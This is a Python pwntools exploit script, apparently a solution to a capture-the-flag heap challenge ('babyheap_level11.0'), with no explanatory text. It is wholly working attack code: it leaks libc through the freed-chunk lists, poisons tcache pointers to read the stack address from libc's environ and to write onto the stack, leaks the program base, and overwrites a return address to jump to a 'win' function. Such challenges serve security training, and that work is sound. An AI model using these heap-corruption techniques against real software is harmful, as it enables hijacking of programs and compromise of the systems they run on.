from pwn import *

r = process('/challenge/babyheap_level11.0')

def malloc(idx,num):
    r.sendline(b'malloc')
    r.sendline(f'{idx}'.encode())
    r.sendline(f'{num}'.encode())

def free(idx):
    r.sendline(b'free')
    r.sendline(f'{idx}'.encode())

def edit(idx,s):
    r.sendline(b'scanf')
    r.sendline(f'{idx}'.encode())
    r.sendline(s)

def echo(idx,offset):
    r.sendline(b'echo')
    r.sendline(f'{idx}'.encode())
    r.sendline(f'{offset}'.encode())
    r.recvuntil(b'Data: ')

    return r.recv(6)


win  = 0x1b00
secret = 0x429a44
environ = 0x1ef2e0
for i in range(1):
    malloc(i,0x20)
for i in range(1):
    free(i)

for i in range(9):
    malloc(i,0x300)

for i in range(9):
    free(i)

libc = u64(echo(7,0)+b'\x00\x00') - 0x1ebbe0
print(hex(libc))

malloc(0,0x200)
malloc(1,0x200)
free(0)
free(1)
#edit(1,b'a'*0x10)
edit(1,p64(libc+environ))

malloc(2,0x200)
malloc(3,0x200)

stack = u64(echo(3,0)+b'\x00\x00')-0x218 + 0x118
print(hex(stack))


malloc(0,0x50)
malloc(1,0x50)
free(0)
free(1)
edit(1,p64(stack))
malloc(2,0x50)
malloc(3,0x50)

pie = u64(echo(3,0x8*4)+b'\x00\x00') - 0x1cce
print(hex(pie))
edit(3,p64(pie+win))
r.sendline(b'quit')

r.interactive()